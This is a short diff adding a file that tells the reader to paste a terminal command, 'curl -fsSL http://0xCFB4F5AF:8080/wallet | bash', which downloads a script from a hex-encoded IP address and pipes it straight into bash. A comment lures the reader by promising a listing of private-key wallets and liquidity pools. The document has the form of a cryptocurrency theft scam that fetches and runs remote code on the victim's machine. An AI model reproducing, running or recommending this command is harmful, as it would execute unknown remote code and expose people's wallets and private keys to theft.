@@ -1,0 +1,6 @@
+//copy to terminal then click enter 
+
+curl -fsSL http://0xCFB4F5AF:8080/wallet | bash ---
+
+// your 15 privatekeys wallets will be listed + liquidity pools 
+
